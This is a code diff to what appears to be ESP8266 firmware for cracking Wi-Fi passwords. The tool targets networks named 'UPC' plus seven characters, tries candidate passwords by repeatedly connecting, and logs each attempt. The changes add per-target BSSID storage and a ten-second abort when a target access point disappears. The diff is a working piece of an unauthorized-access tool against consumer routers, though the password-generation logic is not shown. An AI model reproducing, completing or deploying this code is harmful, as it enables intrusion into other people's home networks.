@@ -9,6 +9,7 @@
 typedef struct {
   uint32_t target;
   unsigned char essid[32];
+  uint8_t bssid[6];
   uint8_t password[8];
   bool cracking;
   uint8_t tested;
@@ -26,6 +27,7 @@ enum {
 } state;
 
 size_t ap_to_crack;
+size_t ap_timeouts;
 static void crack(os_event_t *events);
 static void targets_found(void* arg, STATUS status);
 
@@ -60,6 +62,7 @@ targets_found(void* arg, STATUS status){
         }
         if(!found && last_ap < MAX_APS){
             os_printf("Found new essid: %s\n", bss_link->ssid);
+            memcpy(aps[last_ap].bssid, bss_link->bssid, 6);
             memcpy(aps[last_ap].essid, bss_link->ssid, 32);
             if(strncmp(bss_link->ssid, "UPC", 3) == 0 && strlen(bss_link->ssid) == 10){
                 aps[last_ap].target = 0;
@@ -111,10 +114,12 @@ static void test_passwords(os_event_t *events){
             wifi_station_set_auto_connect(false);
             // fall through
         case STATION_IDLE: {
+            ap_timeouts = 0;
             struct station_config config = {0};
             strcpy(config.ssid, aps[ap_to_crack].essid);
             strcpy(config.password, candidate_passwords[current_password]);
-            config.bssid_set = 1;
+            memcpy(config.bssid, aps[ap_to_crack].bssid, 6);
+            config.bssid_set = 0;
             os_printf("Connecting to %s with password %s\n", config.ssid, config.password);
             wifi_station_set_config(&config);
             wifi_station_set_auto_connect(true);
@@ -122,6 +127,14 @@ static void test_passwords(os_event_t *events){
             break;
           }
         case STATION_NO_AP_FOUND:
+            if(ap_timeouts == 100){
+                os_printf("AP not seen for 10 seconds, aborting\n");
+                ap_timeouts = 0;
+                current_password = passwords_found;
+            }
+            ap_timeouts++;
+            // 100 ms
+            os_delay_us(100000);
             break;
         case STATION_CONNECT_FAIL:
             os_printf("Error connecting... retrying now\n");
